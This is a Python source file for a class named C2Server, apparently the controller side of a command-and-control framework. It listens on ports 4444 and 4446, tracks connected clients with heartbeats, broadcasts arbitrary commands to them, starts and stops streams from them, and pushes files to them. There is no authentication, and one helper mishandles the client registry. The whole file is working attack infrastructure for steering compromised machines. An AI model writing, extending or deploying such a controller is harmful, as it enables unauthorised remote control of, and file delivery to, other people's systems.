import socket
import threading
import time

from server_core.logging import Logger
from server_core.heartbeat import heartbeat_sender
from server_core.acceptor import accept_loop


class C2Server:
    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445, stream_port=4446):
        self.host = host
        self.command_port = command_port
        self.heartbeat_port = heartbeat_port
        self.stream_port=stream_port

        self.clients = {}
        self.lock = threading.Lock()
        self.running = True

        self.heartbeat_interval = 10
        self.client_retention = 3600

        self.logger = Logger(lambda: self.running)

    def log(self, msg):
        self.logger.log(msg)

    def start(self, ui):
        if not getattr(ui, "handles_logs", False):
            threading.Thread(target=self.logger.printer, daemon=True).start()
            
        threading.Thread(target=heartbeat_sender, args=(self,), daemon=True).start()

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.command_port))
        server.listen(50)

        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        stream.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        stream.bind((self.host, self.stream_port))
        stream.listen(50)

        self.log(f"[*] Server listening for commands on {self.command_port}, stream port: {self.stream_port}")

        threading.Thread(
            target=accept_loop,
            args=(self, server, stream),
            daemon=True
        ).start()

        ui.run(self)

        return server

    def stop(self):
        self.running = False
        with self.lock:
            for c in self.clients.values():
                c.close()

    # ---------------- COMMANDS ----------------
    def broadcast_command(self, command):
        with self.lock:
            clients = list(self.clients.values())

        for client in clients:
            with client.lock:
                if not client.active:
                    continue
                try:
                    client.cmd_socket.send((command + '\n').encode())
                    client.set_time(time.time())
                except Exception as e:
                    self.log(f"[!] Send failed to {client.ip}: {e}")
                    client.close()

    def client_command(self, uid_prefix, command):
        target = self.find_client_by_prefix(uid_prefix)

        if not target:
            self.log("[ERR] Client not found or ambiguous")
            return

        with target.lock:
            try:
                target.cmd_socket.send((command + '\n').encode())
                target.set_time(time.time())
            except Exception:
                target.close()

    def client_stream(self, uid_prefix):
        target = self.find_client_by_prefix(uid_prefix)
        if not target:
            self.log("[ERR] Client not found or ambiguous")
            return

        with target.lock:
            try:
                target.cmd_socket.send(('STREAM|4446' + '\n').encode())
                target.set_time(time.time())
            except Exception:
                target.close()

    def stop_stream(self, uid_prefix):
        target = self.find_client_by_prefix(uid_prefix)
        if not target:
            self.log("[ERR] Client not found or ambiguous")
            return

        with target.lock:
            try:
                target.cmd_socket.send(('STOPSTREAM' + '\n').encode())
            except Exception:
                target.close()


    def find_client_by_prefix(self, uid_prefix:str):
        with self.lock:
            matches = [
                c for uid, c in self.clients.items() if uid.startswith(uid_prefix)
            ]
        if len(matches) == 1:
            return matches[0]
        return None

    def push_file_to_client(self, uid_prefix, source_path, dest_path):
        target = self.find_client_by_prefix(uid_prefix)
        if not target:
            self.log(f"[ERR] Client not found or ambiguous: {uid_prefix}")
            return

        try:
            with open(source_path, 'rb') as f:
                content = f.read()
        except FileNotFoundError:
            self.log(f"[ERR] File not found: {source_path}")
            return
        except Exception as e:
            self.log(f"[ERR] Error reading file {source_path}: {e}")
            return

        header = f"PUSH|{dest_path}|{len(content)}".encode()
        separator = "\n".encode()
        command = header + separator + content
        self.log((header+separator).hex())

        self.log(command[:len(header) + 1])  # header
        self.log("-------")
        self.log(command[len(header) + 1:len(header) + 65].hex())
        self.log("-------")
        self.log(content[:65].hex())
        with target.lock:
            try:
                target.cmd_socket.sendall(command)
                target.set_time(time.time())
                self.log(f"Sent {source_path} to {target.unique_id[:8]}...")
            except Exception as e:
                self.log(f"[ERR] Failed to send file to {target.unique_id[:8]}: {e}")
                target.close()

    def push_file_to_all_clients(self, source_path, dest_path):
        for client in self.clients:
            self.push_file_to_client(client.unique_id, source_path, dest_path)


    def list_command(self):
        with self.lock:
            clients = self.clients.values()
            if not clients:
                self.log("No clients registered")
                return
            
            self.log("Clients:")
            for client in clients:
                with client.lock:
                    state = "ACTIVE" if client.active else "INACTIVE"
                    idle = int(time.time() - client.last_seen)
                    self.log(
                        f"{client.unique_id} -> {client.ip}:{client.cmd_port} "
                        f"State: {state}; idle:{idle}s; HeartBeat port:{client.heartbeat_port}"
                    )